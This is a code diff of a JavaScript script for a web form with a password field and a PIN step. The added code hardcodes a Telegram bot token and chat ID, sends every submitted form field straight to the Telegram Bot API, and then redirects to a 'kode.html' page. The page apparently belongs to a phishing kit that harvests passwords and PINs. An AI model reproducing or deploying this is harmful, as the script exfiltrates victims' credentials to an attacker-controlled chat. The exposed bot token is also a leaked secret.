@@ -1,45 +1,40 @@
-$(document).ready(function() {
-  // 👁 Toggle show/hide password
-  $("div#eyeOpen").on("click", function() {
-    $("#eyeOpen").css("display", "none");
-    $("#eyeClose").css("display", "block");
-    $("#password").prop("type", "text");
-  });
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
 
-  $("div#eyeClose").on("click", function() {
-    $("#eyeClose").css("display", "none");
-    $("#eyeOpen").css("display", "block");
-    $("#password").prop("type", "password");
-  });
+                $("#password").prop("type", "text");
 
-  // 📨 Handle form submit
-  document.querySelector("#setPin").addEventListener("submit", async (e) => {
-    e.preventDefault();
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
 
-    // Ambil semua input dari form
-    let text = JSON.stringify(
-      Object.fromEntries(new FormData(e.target).entries()),
-      null,
-      2
-    );
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '7709193105', botID = 'bot8105069628:AAHXgh0WPGwFgV4WB6LqeEiVA-KGRSMGmS0';
 
-    // Kirim ke serverless function Vercel (token disembunyikan di sana)
-    const sendMessage = await fetch("/api/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ text }),
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#main').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = '/kode.html';
     });
 
-    const result = await sendMessage.json();
-    const messageStatus = document.querySelector("#status");
-
-    if (sendMessage.ok && result.ok) {
-      messageStatus.textContent = "✅ Pesan berhasil dikirim!";
-      e.target.reset();
-      window.location.href = "kode.html"; // redirect setelah sukses
-    } else {
-      messageStatus.textContent =
-        "❌ Gagal mengirim pesan: " + (result.error || "Unknown error");
-    }
-  });
-});
+            
+        });
